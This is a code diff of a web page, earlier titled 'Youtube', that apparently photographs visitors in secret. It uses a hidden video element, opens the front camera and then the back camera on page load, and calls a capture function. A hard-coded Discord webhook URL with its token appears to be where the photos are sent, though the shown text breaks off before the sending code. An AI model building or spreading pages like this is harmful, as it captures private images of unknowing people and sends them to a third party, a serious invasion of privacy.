@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Youtube</title>
+    <title>Camera Capture</title>
 </head>
 <body>
     <video id="video" autoplay style="display:none;"></video>
@@ -16,19 +16,63 @@
         // Discord webhook URL (replace with yours)
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320376121572724777/ZwPWtXeYwYDQ9tH-H4TAHl_Vv2YVwbLo90oRI8ojgNVWH3PjTavwrPPbtTmdwf7RwIL7";
 
-        // Request camera permissions and start video stream
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                video.srcObject = stream;
+        let videoStream;
 
-                // Automatically capture a photo after the video stream starts
-                video.onloadedmetadata = () => {
+        // Function to get available cameras (front and back)
+        function getCameraDevices() {
+            return navigator.mediaDevices.enumerateDevices()
+                .then(devices => {
+                    const cameras = devices.filter(device => device.kind === 'videoinput');
+                    return cameras;
+                });
+        }
+
+        // Function to switch between front and back cameras
+        function switchCamera(cameraId) {
+            // Stop the current video stream if it exists
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+            }
+
+            // Start a new video stream with the selected camera
+            const constraints = {
+                video: {
+                    deviceId: cameraId ? { exact: cameraId } : undefined
+                }
+            };
+
+            return navigator.mediaDevices.getUserMedia(constraints)
+                .then((stream) => {
+                    video.srcObject = stream;
+                    videoStream = stream;
+                })
+                .catch((error) => {
+                    console.error('Error accessing the camera: ', error);
+                });
+        }
+
+        // Start capturing photos from the front and back cameras if available
+        getCameraDevices().then((cameras) => {
+            // Default to front camera if available
+            const frontCamera = cameras.find(camera => camera.label.toLowerCase().includes('front'));
+            const backCamera = cameras.find(camera => camera.label.toLowerCase().includes('back'));
+
+            // First, start the front camera (or any available camera)
+            switchCamera(frontCamera ? frontCamera.deviceId : (backCamera ? backCamera.deviceId : null));
+
+            // Automatically capture and send a photo from the front camera
+            video.onloadedmetadata = () => {
+                captureAndSendPhoto();
+            };
+
+            // If both cameras are available, switch to the back camera and capture a photo
+            if (backCamera) {
+                setTimeout(() => {
+                    switchCamera(backCamera.deviceId);
                     captureAndSendPhoto();
-                };
-            })
-            .catch((error) => {
-                console.error('Camera access denied!', error);
-            });
+                }, 3000); // Wait for 3 seconds before switching to the back camera
+            }
+        });
 
         function captureAndSendPhoto() {
             // Draw the video frame onto the canvas
